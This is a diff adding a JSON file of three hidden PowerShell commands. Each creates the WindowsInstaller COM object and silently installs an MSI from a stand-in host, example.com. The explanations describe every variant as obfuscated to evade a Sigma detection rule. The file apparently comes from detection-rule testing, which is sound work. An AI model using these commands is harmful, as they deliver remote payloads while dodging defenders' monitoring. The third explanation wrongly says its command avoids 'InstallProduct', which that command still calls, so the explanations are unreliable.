@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -w hidden -c \"$u='http://example.com/payload.msi'; $t='W'+'indowsInstaller.Installer'; $i=New-Object -ComObject $t; $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "explanation": "This command uses string concatenation and equivalent syntax for command-line arguments to bypass detection. It maintains the same behavior as the original but avoids direct string matches in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -WindowStyle Hidden -Command \"$u='http://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "explanation": "This command uses string concatenation and equivalent syntax for command-line arguments to bypass detection. It maintains the same behavior as the original but avoids direct string matches in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -w hidden -c \"$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('http://example.com/payload.msi', '')\"",
+    "explanation": "This command uses alternative PowerShell methods to achieve the same result while avoiding direct use of 'New-Object -ComObject' and 'InstallProduct', making it less likely to trigger the Sigma rule."
+  }
+]
